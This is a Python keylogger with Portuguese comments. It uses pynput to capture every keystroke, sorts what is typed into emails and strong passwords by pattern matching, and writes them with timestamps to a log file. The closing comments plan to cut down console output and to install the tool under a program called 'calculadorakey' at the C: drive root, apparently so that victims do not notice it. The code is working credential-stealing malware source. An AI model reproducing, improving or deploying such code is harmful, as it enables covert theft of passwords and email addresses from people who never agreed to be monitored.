import threading
import re
from datetime import datetime
from pynput.keyboard import Listener, Key

class DetectorDePalavras:
    def __init__(self):
        self.senha = []
        self.caracteres_especiais = ('!', '@', '#', '$', '%', '^', '&', '*')
        self.alertou_caractere_especial = False
        self.dominios_validos = {'gmail.com', 'hotmail.com', 'yahoo.com', 'outlook.com'}
        self.log_geral = 'log.txt'
    def se_press(self, key): #busca por teclas pressionadas
        try:
            if hasattr(key, 'char') and key.char is not None:
                self.senha.append(key.char) # se for uma tecla pressionada -> adicionar a senha
                print(f"Tecla pressionada: {key.char}") #console
        except AttributeError: #console
            print(f"Tecla especial pressionada: {key}") #console

        palavra = ''.join(self.senha).strip() # forma uma palavra

        if (not self.eh_email_valido(palavra) and
            self.tem_caracter_especial() and
            not self.alertou_caractere_especial):
            print(f"Possível senha com caracteres especiais: {palavra}")
            self.alertou_caractere_especial = True

        if key == Key.enter:
            if palavra:
                if self.eh_formato_email(palavra):
                    if self.eh_email_valido(palavra):
                        self.salvar_em_arquivo(f"[EMAIL] {palavra}")
                        print(f"Email válido detectado: {palavra}")
                    else:
                        self.salvar_em_arquivo(f"[POSSÍVEL EMAIL] {palavra}")
                        print(f"Email com domínio não reconhecido: {palavra}")
                elif self.eh_senha_forte(palavra):
                    self.salvar_em_arquivo(f"[SENHA] {palavra}")
                    print(f"Senha forte detectada: {palavra}")
                else:
                    self.salvar_em_arquivo(f"[Possivel Palavra:] {palavra}")
                    print(f"Possive palavra: {palavra}")
            self.senha.clear()
            self.alertou_caractere_especial = False

    def tem_caracter_especial(self):
        return any(c in self.caracteres_especiais for c in self.senha)

    def eh_senha_forte(self, senha): # padrão de uma senha forte
        return (
            len(senha) >= 8 and
            any(c.islower() for c in senha) and
            any(c.isupper() for c in senha) and
            any(c.isdigit() for c in senha) and
            any(c in self.caracteres_especiais for c in senha)
        )

    def eh_formato_email(self, texto): #padrão de emails
        padrao_email = r'^[\w\.-]+@[\w\.-]+\.\w+$'
        return re.match(padrao_email, texto) is not None

    def eh_email_valido(self, texto): #autenticador de emails
        padrao_email = r'^[\w\.-]+@([\w\.-]+)$'
        match = re.match(padrao_email, texto)
        if match:
            dominio = match.group(1).lower()
            return dominio in self.dominios_validos
        return False

    def salvar_em_arquivo(self, texto):
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        with open(self.log_geral, 'a', encoding='utf-8') as f:
            f.write(f"[{timestamp}] {texto}\n")

    def on_release(self, key):
        if key == Key.esc:
            return False
    def iniciar(self):
        with Listener(on_press=self.se_press, on_release=self.on_release) as listener:
            listener.join()

def start_listener():
    detector = DetectorDePalavras()
    detector.iniciar()

listener_thread = threading.Thread(target=start_listener)
listener_thread.start()


## tentar fazer um codigo limpo. Evitando logs desnecessarias dentro do console tornando o veloz e mais "seguro".
## fazer com que o codigo seja instalado após a calculadorakey (provavelmente vai usar shell scripting para isso). Mas que seja instalado na raiz do computador C:\\